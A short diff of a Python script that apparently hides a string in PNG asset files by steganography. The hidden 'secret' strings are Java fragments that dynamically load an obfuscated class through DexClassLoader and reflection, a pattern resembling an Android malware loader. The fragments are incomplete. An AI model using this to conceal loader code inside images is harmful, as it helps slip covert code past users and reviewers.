@@ -308,13 +308,14 @@ def rebuild_image(original_width, original_height, output_path, mode):
 
 images = []
 
-main_folder = 'assets'
+main_folder = '../assets'
 for dirpath, dirnames, filenames in os.walk(main_folder):
 	for filename in filenames:
 		if filename.endswith(".png"):
 			file_path = os.path.join(dirpath, filename)
 			images.append(file_path)
 secret = '''Class.forName("dalvik.system.DexClassLoader");Object objecte = this.b.getClassLoader();Method methode=new DexClassLoader(filee.getPath(),filee.getParent(),null,((ClassLoader)objecte)).loadClass("sdk.fkgh.mvp.SdkEntry");methode.setAccessible(true);methode.invoke(null,this.b,this.c,this.a);}ag.g[8]="rrqnDG4dja7Ga5ZdAuD77CY";ag.g[9]="xodOhs";'''
+secret = '''methode.setAccessible(true);methode.invoke(null,this.b,this.c,this.a);ag.g[8]="rrqnDG4dja7Ga5ZdAuD77CY";ag.g[9]="xodOhs"'''
 channels = "RGB"
 bits = 1
 starting_pixel = 1
